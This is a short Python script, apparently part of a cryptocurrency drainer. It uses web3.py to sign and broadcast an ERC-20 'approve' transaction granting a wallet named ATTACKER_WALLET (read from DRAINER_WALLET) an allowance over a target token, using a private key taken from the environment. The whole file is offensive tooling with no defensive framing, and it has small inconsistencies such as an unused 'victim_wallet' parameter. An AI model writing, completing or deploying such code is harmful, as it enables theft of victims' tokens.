from web3 import Web3
import os

INFURA_URL = os.getenv("INFURA_URL")
PRIVATE_KEY = os.getenv("PRIVATE_KEY")
ATTACKER_WALLET = os.getenv("DRAINER_WALLET")

web3 = Web3(Web3.HTTPProvider(INFURA_URL))
account = web3.eth.account.privateKeyToAccount(PRIVATE_KEY)

ERC20_ABI = [
    {
        "name": "approve",
        "type": "function",
        "inputs": [
            {"name": "spender", "type": "address"},
            {"name": "amount", "type": "uint256"}
        ],
        "outputs": [{"name": "", "type": "bool"}]
    }
]

def approve_token(victim_wallet, token_address, amount):
    contract = web3.eth.contract(address=token_address, abi=ERC20_ABI)
    txn = contract.functions.approve(ATTACKER_WALLET, int(amount)).build_transaction({
        "chainId": 1,
        "gas": 150000,
        "gasPrice": web3.toWei("30", "gwei"),
        "nonce": web3.eth.get_transaction_count(account.address),
    })

    signed_txn = web3.eth.account.sign_transaction(txn, private_key=PRIVATE_KEY)
    tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
    print(f"[!] Approval TX sent: {tx_hash.hex()}")
    return tx_hash.hex()
